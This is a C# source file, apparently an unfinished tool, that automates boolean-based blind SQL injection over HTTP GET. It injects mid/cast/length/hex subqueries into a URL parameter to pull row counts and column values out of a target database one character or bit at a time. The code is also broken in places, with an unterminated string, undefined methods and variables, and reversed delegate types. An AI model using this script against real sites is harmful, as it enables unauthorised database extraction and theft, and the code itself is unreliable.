using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Task;
using System.Linq;
using System.Text;

public class Test
{
	public static void Main()
	{
		// your code goes here
	}
	
	private static var client = new HttpClient();
	
	private static string CraftURL(string url, string query_format, string query){
		return $"{url}?{string.Format(query_format, query)};
	}
	
	private static async Task<string> _get_html(string url){
		string result = null;
		try{ result = await client.GetStringAsync(url); }
		catch(Exception ex){ /*Log & Retry*/ }
		return result ?? "";
	}
	
	public static async Task<int> get_int_10(string url, string query_format, string target_query, Func<bool, string> check_func) {
		string result_s = "";
		int index = 1;
		while(true){
			//全桁見たかチェック
			string test_url = CraftURL(url, query_format, $"mid(cast({target_query} as char),{index},1)=''");
			string html = await _get_html(test_url);
			if(check_func(html)) break;
			//現在の桁の数字を取得
			for(int i = 0x30; i < 0x39; i++){
				test_url = CraftURL(url, query_format, $"mid(cast({target_query} as char),{index},1)=0x" + i.ToString("X2"));
				html = await _get_html(test_url);
				if(check_func(html)){
					result_s += (char)i;
					break;
				}
			}
			index++;
		}
		return result_s == "" ? 0 : int.Parse(result_s);
	}
	
	// GET, Boolean
	// query_format => name=aa' and {0}-- -
	// target_query => data or select
	public static async Task<int> string_length(string url, string query_format, string target_query, Func<bool, string> check_func) {
		return await get_int(url, query_format, $"length({target_query})", check_func);
	}
	
	//GET, Boolean
	//row >= 0
	public static async Task<string> get_string(string url, string query_format, string table, string column, int row, Func<bool, string> check_func, Encoding encoding = Encoding.UTF8, bool row_check = false){
		if(row_check && await get_int_10(url, query_format, $"(select count(*) from {table})", check_func) <= row)
			return null;
		var query = $"(select {column} from {table} limit {row},1)";
		var result = new List<byte>();
		int length = await string_length(url, query_format, query, check_func);
		for(int i = 1; i <= length; i++){
			byte buf = 0x00;
			for(int j = 1; j <= 8; j++)
				buf = (buf << 1) | check_func(await _get_html(CraftURL(url, query_format, $"mid(bin(mid(hex({query}),{2 * i - 1})),{j},1)")));
			result.Add(Convert.ToInt16(byte1, 2));
		}
		return encoding.GetString(result.ToArray());
	}
}
